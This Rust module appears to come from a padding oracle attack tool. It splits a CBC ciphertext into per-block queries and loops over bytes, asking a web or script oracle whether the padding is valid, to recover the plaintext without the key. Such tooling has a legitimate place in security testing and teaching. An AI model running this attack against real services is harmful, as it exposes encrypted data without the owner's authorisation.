use anyhow::{Context, Result};

use crate::{
    block::{
        block_answer::BlockAnswer,
        block_question::{cypher_text::CypherText, BlockQuestion},
    },
    oracle::{oracle_location::OracleLocation, script::ScriptOracle, web::WebOracle, Oracle},
};

/// Manages the oracle attack on a high level.
pub struct Questioning {
    block_questions: Vec<BlockQuestion>,
}

impl Questioning {
    /// Divides the cypher text into a modifiable part for each block.
    pub fn prepare(cypher_text: CypherText) -> Result<Self> {
        // all blocks, except the 0-th which is the IV, are to be decrypted.
        // This could change with a "noiv" option
        let blocks_to_skip = 1;

        // decryption is based on recognizing padding. Padding is only at the end of a message. So to decrypt the n-th block, all blocks after it have to be dropped and the "n - 1"-th block must be tweaked.
        let mut block_questions = Vec::with_capacity(cypher_text.amount_blocks() - blocks_to_skip);
        for block_to_decrypt_idx in blocks_to_skip..cypher_text.amount_blocks() {
            block_questions.push(BlockQuestion::clone_part_of_cypher_text(
                &cypher_text,
                block_to_decrypt_idx - 1,
            )?);
        }

        Ok(Self { block_questions })
    }

    /// Actually performs the oracle attack for each block.
    pub fn start(&mut self, oracle_location: &OracleLocation) -> Result<Vec<BlockAnswer>> {
        let oracle: Box<dyn Oracle> = match oracle_location {
            OracleLocation::Web(_) => Box::new(WebOracle::visit(oracle_location)?),
            OracleLocation::Script(_) => Box::new(ScriptOracle::visit(oracle_location)?),
        };

        self.block_questions
            .iter_mut()
            .map(|question| {
                let current_block_idx = question.amount_blocks();

                let mut bytes_answered = 0;
                while bytes_answered < *question.block_size() {
                    let correct_padding = oracle.ask_validation(question)?;

                    if correct_padding {
                        bytes_answered += 1;
                        question
                            .lock_byte()
                            .context(format!("Failed to decrypt block {}", current_block_idx))?;
                    } else {
                        question
                            .increment_current_byte()
                            .context(format!("Failed to decrypt block {}", current_block_idx))?;
                    }
                }

                question.try_into()
            })
            .collect()
    }
}
